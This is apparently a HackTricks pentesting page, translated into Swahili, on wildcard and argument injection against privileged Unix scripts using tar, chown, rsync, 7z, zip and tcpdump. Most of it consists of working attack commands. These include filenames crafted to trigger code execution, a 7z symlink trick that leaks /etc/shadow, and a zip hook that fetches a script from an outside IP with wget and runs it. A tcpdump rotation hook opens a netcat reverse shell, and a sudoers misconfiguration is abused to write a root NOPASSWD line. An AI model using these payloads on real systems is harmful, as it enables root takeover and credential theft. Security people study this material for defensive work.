# Mbinu za Ziada za Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **argument injection** ya Wildcard (pia huitwa *glob*) hutokea script yenye privilege inapotekeleza Unix binary kama `tar`, `chown`, `rsync`, `zip`, `7z`, … ikiwa na wildcard isiyo na nukuu kama `*`.
> Kwa kuwa shell hupanua wildcard **kabla** ya kutekeleza binary, attacker anayeweza kuunda files katika working directory anaweza kutengeneza filenames zinazoanza na `-`, ili zitafsiriwe kama **options badala ya data**, na hivyo kusafirisha kwa siri flags holela au hata commands.<sup>[[6]](#references)</sup>
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na detections za kisasa za 2023-2025.

## chown / chmod

Unaweza **kunakili owner/group au permission bits kutoka kwenye reference file** kwa kutumia vibaya flag ya `--reference` wakati filename inayoonekana kama option inapopanuliwa na wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Wakati root atakapotekeleza baadaye kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=.drf.php` iliyopanuliwa inabatilisha owner/mode iliyoainishwa wazi, na kusababisha faili zinazolingana kurithi metadata kutoka kwa `.drf.php` (na, kwa usanidi ulio hapo juu, kuzifanya ziweze kuandikwa na attacker).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Tazama pia paper ya kawaida ya DefenseCode kwa maelezo zaidi.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Tekeleza amri arbitrary kwa kutumia vibaya **checkpoint** feature ya GNU tar na checkpoint actions.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Mara root anapoendesha kwa mfano `tar -czf /root/backup.tgz *`, `shell.sh` hutekelezwa kama root.<sup>[[10]](#references)</sup>

### Tahadhari kuhusu bsdtar / macOS compressor override

`tar` ya default kwenye macOS za hivi karibuni (inayotegemea `libarchive`) haitoi interface ya `--checkpoint` ya GNU tar, lakini bsdtar inaandika kuhusu **--use-compress-program** kwa kuchagua compressor ya nje.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
When script yenye privileged permissions inaendesha `tar -cf backup.tar *`, hii huchagua `sh` kupitia `PATH` ya mwathiriwa, na bsdtar huiendesha kama compressor.<sup>[[11]](#references)</sup> Hii inathibitisha option injection, lakini yenyewe si primitive ya kuaminika ya arbitrary-command: filename iliyoundwa na wildcard haiwezi kuwa na `/`, na bsdtar hutoa archive data badala ya shell command iliyochaguliwa na attacker. Code execution pia inahitaji executable inayoweza kudhibitiwa na inayotafutwa kupitia `PATH`, au argument channel nyingine inayoweza kutaja program muhimu.

---

## rsync

`rsync` hukuruhusu kubadilisha remote shell au remote binary kupitia command-line flags kama `-e` na `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye itaweka directory kwenye archive kwa `rsync -az * backup:/srv/`, flag iliyoingizwa inaweza kuendesha shell kupitia remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata wakati script yenye privileged access *inapotanguliza* wildcard kwa `--` (ili kuzuia option parsing), 7-Zip CLI hukubali **file list files** kwa kutanguliza filename kwa `@`. Kuchanganya hilo na symlink hukuwezesha *ku-exfiltrate arbitrary files*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root ataendesha kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na itaacha kufanya kazi, **ikichapisha yaliyomo kwenye stderr**.<sup>[[13]](#references)</sup>

Hii bado hufanya kazi licha ya `-- *` kwa sababu CLI ya 7-Zip inakubali waziwazi majina ya kawaida ya faili na `@listfiles` kama inputs za positional, hivyo jina halisi la faili kama `@root.txt` bado linashughulikiwa kwa njia maalum.<sup>[[13]](#references)</sup>

---

## zip

Kuna primitives mbili za vitendo sana pale application inapopitisha majina ya faili yanayodhibitiwa na mtumiaji kwa `zip` (ama kupitia wildcard au kwa kuorodhesha majina bila `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE kupitia test hook: `-T` huwezesha “test archive” na `-TT <cmd>` hubadilisha tester na program yoyote (long form: `--unzip-command <cmd>`). Ikiwa unaweza kuingiza majina ya faili yanayoanza na `-`, gawanya flags katika majina tofauti ya faili ili short-options parsing ifanye kazi.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Maelezo
- USIJARIBU jina moja la faili kama `'-T -TT <cmd>'` — short options huchanganuliwa kwa kila herufi na itashindwa. Tumia tokeni tofauti kama ilivyoonyeshwa.<sup>[[3]](#references)</sup>
- Ikiwa slashes zitaondolewa kutoka kwa majina ya faili na app, fetch kutoka kwa bare host/IP (default path `/index.html`) na uhifadhi locally kwa `-O`, kisha execute.<sup>[[3]](#references)</sup>
- Unaweza kutatua parsing kwa `-sc` (show processed argv) au `-h2` (more help) ili kuelewa jinsi tokeni zako zinavyotumiwa.<sup>[[3]](#references)</sup>

Mfano (local behavior kwenye zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ikiwa web layer inaonyesha `zip` stdout/stderr (jambo la kawaida kwenye wrappers zisizo makini), flags zilizoingizwa kama `--help` au errors kutoka kwa options zisizo sahihi zitaonekana kwenye HTTP response, zikithibitisha command-line injection na kusaidia kuboresha payload.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

Wakati privileged wrapper inapanua directory inayoweza kuandikwa kwa kutumia wildcard, option hooks hizi zilizoandikwa zinafaa kuchunguzwa.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Pitisha command string kwa shell |
| `git`   | `-c core.sshCommand=<cmd>` | Tumia `<cmd>` badala ya SSH kwa Git fetch/push |
| `scp`   | `-S <program>` | Tumia connection program mbadala inayooana na SSH |

Primitives hizi ni useful checks zaidi ya classics za *tar/rsync/zip*.

---

## Hunting vulnerable wrappers and jobs

Case studies za hivi karibuni na detection guidance zinaonyesha kuwa wildcard/argv injection si tatizo la **cron + tar** pekee tena.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aina hii hii ya bug inaendelea kuonekana kwenye:

- web features zinazosema "download everything as zip/tar" kutoka upload directories zinazodhibitiwa na attacker
- vendor/appliance debug shells zinazofichua **tcpdump** wrapper yenye filename/filter fields zinazodhibitiwa na attacker
- backup au rotation jobs zinazoita `tar`, `rsync`, `7z`, `zip`, `chown`, au `chmod` kwenye directories zinazoweza kuandikwa

Useful triage commands (`pspy` invocation inatumia process/file-event na interval flags zilizoandikwa kwenye documentation).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Mbinu za haraka za kutathmini:

- `-- *` ni suluhisho zuri kwa zana nyingi za GNU, lakini **si** kwa `7z`/`7za` kwa sababu `@listfiles` huchanganuliwa kando.<sup>[[13]](#references)</sup>
- Kwa `zip`, tafuta wrappers zinazoorodhesha majina ya faili yanayodhibitiwa na mtumiaji moja kwa moja; kugawanya short-option (`-T` + `-TT <cmd>`) bado hufanya kazi hata bila shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Kwa `tcpdump`, zingatia hasa wrappers zinazokuruhusu kudhibiti **majina ya faili za output**, **mipangilio ya rotation**, au arguments za **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE kupitia argv injection katika wrappers

Wakati restricted shell au vendor wrapper inaunda command line ya `tcpdump` kwa kuunganisha fields zinazodhibitiwa na mtumiaji (kwa mfano, parameter ya "file name") bila quoting/validation madhubuti, unaweza kuficha `tcpdump` flags za ziada. Mchanganyiko wa `-G` (rotation inayotegemea muda), `-W` (kuweka kikomo cha idadi ya faili), na `-z <cmd>` (command ya baada ya rotation) husababisha command execution kiholela kwa ruhusa za mtumiaji anayeendesha tcpdump (mara nyingi root kwenye appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper haisafishi spaces au tokens zinazoanza na `-` katika field ya file name.<sup>[[4]](#references)</sup>

PoC ya kawaida (inatekeleza reverse shell script kutoka kwenye path inayoweza kuandikwa).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` hubadilika kila sekunde, na `-W 1` husitisha baada ya faili moja kuzungushwa; capture lazima ipokee packet inayolingana kabla ya mzunguko.<sup>[[18]](#references)</sup>
- `-z <cmd>` huendesha post-rotate command mara moja kwa kila mzunguko na hupitisha path ya savefile iliyofungwa kama argument; hakikisha ushughulikiaji wa script/interpreter arguments unaendana na payload yako.<sup>[[18]](#references)</sup>

Variants bila removable media:

- Ikiwa una primitive nyingine yoyote ya kuandika files (kwa mfano, command wrapper tofauti inayoruhusu output redirection), weka script yako kwenye path inayojulikana na u-trigger `-z /path/script.sh`; script iitishe `/bin/sh` yenyewe inapohitajika.<sup>[[18]](#references)</sup>
- Ikiwa vendor wrapper inakuruhusu kuchagua path iliyozungushwa, audit udhibiti huo wa path pamoja tu na post-rotate command inayotafsiri savefile argument yake; udhibiti wa path pekee hau-execute contents za file.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump yenye wildcards/additional args → arbitrary write/read na root

Mfano wa sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Sheria inaacha options kadhaa zipatikane kupitia parser iliyoandikwa kwenye documentation ya tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob ya `*` na patterns zinazoruhusu hubana tu argument ya kwanza ya `-w`. `tcpdump` inakubali options nyingi za `-w`; ya mwisho ndiyo hutumika.<sup>[[3]](#references)[[18]](#references)</sup>
- Sheria haibani options nyingine, kwa hivyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.<sup>[[3]](#references)[[18]](#references)</sup>

Primitives husika zimeandikwa hapa chini.<sup>[[3]](#references)[[18]](#references)</sup>
- Override path ya destination kwa kutumia `-w` ya pili (ya kwanza inatimiza tu hitaji la sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ndani ya `-w` ya kwanza ili kutoka kwenye tree yenye vikwazo.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lazimisha umiliki wa output kwa `-Z root` (huunda mafaili yanayomilikiwa na root popote).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Uandishi wa maudhui holela kwa kucheza tena PCAP iliyoundwa kwa ustadi kupitia `-r` (kwa mfano, kuweka mstari wa sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Unda PCAP iliyo na payload kamili ya ASCII na uiandike kama root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Usomaji wa faili kiholela/secret leak kwa `-V <file>` (hutafsiri orodha ya savefiles). Ujumbe wa uchunguzi wa hitilafu mara nyingi hurudia mistari, na hivyo kusababisha content leak.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Mlolongo Kamili wa Exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Imegunduliwa](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Rudi Kwenye Wakati Ujao: Unix Wildcards Zimekuwa za Fujo (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) mwongozo](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) mwongozo](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaksia ya command line ya 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) mwongozo](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [17] [Mwongozo wa OpenBSD `scp`](https://man.openbsd.org/scp)
- [18] [Mwongozo wa tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
